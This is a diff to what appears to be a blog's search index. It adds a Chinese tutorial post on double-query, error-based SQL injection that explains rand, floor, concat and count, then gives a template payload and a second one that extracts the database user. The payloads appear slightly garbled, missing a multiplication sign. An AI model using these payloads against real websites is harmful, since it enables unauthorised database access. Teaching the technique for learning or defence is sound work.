@@ -3,6 +3,35 @@
   
     
     <entry>
+      <title><![CDATA[SQL注入之双查询]]></title>
+      <url>/2019/08/16/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8F%8C%E6%9F%A5%E8%AF%A2/</url>
+      <content type="html"><![CDATA[<h1 id="双查询注入简介"><a href="#双查询注入简介" class="headerlink" title="双查询注入简介"></a>双查询注入简介</h1><p>双查询注入简单而言，就是一个select语句中还有一个select语句</p>
+<h1 id="双查询注入基本函数"><a href="#双查询注入基本函数" class="headerlink" title="双查询注入基本函数"></a>双查询注入基本函数</h1><h2 id="rand-函数"><a href="#rand-函数" class="headerlink" title="rand()函数"></a>rand()函数</h2><p>rand函数是一个随机函数，它的作用是可以产生0~1之间的任意随机数。</p>
+<h2 id="floor-函数"><a href="#floor-函数" class="headerlink" title="floor()函数"></a>floor()函数</h2><p>floor函数是一个取整函数，结果返回小于等于你输入的数的整数。只返回数值的整数部分，小数部分忽略</p>
+<h2 id="concat（）函数"><a href="#concat（）函数" class="headerlink" title="concat（）函数"></a>concat（）函数</h2><p>concat是一个连接函数，可以将两个字符串拼接为一个字符串。</p>
+<h2 id="count-函数"><a href="#count-函数" class="headerlink" title="count(*)函数"></a>count(*)函数</h2><p>count(*)是一个统计行的函数，可以计算出由select语句返回的结果集中的行数。</p>
+<h1 id="固定注入公式"><a href="#固定注入公式" class="headerlink" title="固定注入公式"></a>固定注入公式</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,( 注入语句),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from (select count(*), concat(&apos;~&apos;,(select user()),&apos;~&apos;, floor(rand()2))as a from information_schema.tables group by a)x;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      
+        <categories>
+            
+            <category> 安全 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[SQL注入之information_schema库]]></title>
       <url>/2019/08/15/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Binformation-schema%E5%BA%93/</url>
       <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
